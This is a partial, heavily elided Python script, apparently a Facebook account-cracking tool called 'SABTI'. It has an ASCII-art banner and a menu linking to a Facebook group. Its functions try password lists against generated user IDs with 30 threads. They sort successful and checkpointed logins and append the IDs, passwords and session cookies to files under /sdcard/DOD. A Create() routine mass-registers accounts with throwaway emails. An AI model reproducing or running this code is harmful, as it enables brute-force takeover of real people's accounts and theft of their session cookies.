...
| $$  | $$| $$  | $$ /$$  \ $$ /$$  \ $$| $$  | $$| $$\  $ | $$| $$  | $$  >$$  $$ | $$$/ \  $$$| $$  | $$| $$        | $$  | $$  | $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$  | $$| $$ \/  | $$| $$  | $$ /$$/\  $$| $$/   \  $$| $$  | $$| $$$$$$$$ /$$$$$$| $$$$$$$/
 \______/  \______/  \______/  \______/ |__/  |__/|__/     |__/|__/  |__/|__/  \__/|__/     \__/|__/  |__/|________/|______/|_______/ 
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                Create()
                 ...
                 os.system('xdg-open https://facebook.com/groups/824997615914525/')
            elif xd in ['0','00']:
                exit(' Thanks for use 🥰 ')
            else:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SABTI:     
                        clear()
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [SABTI] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [SABTI-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/DOD/SABTI-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/DOD/SABTI-CP.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SABTI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
                                        open('/sdcard/DOD/MUGHAL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DOD/SABTI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SABTI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [SABTI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [SABTI] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [SABTI-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
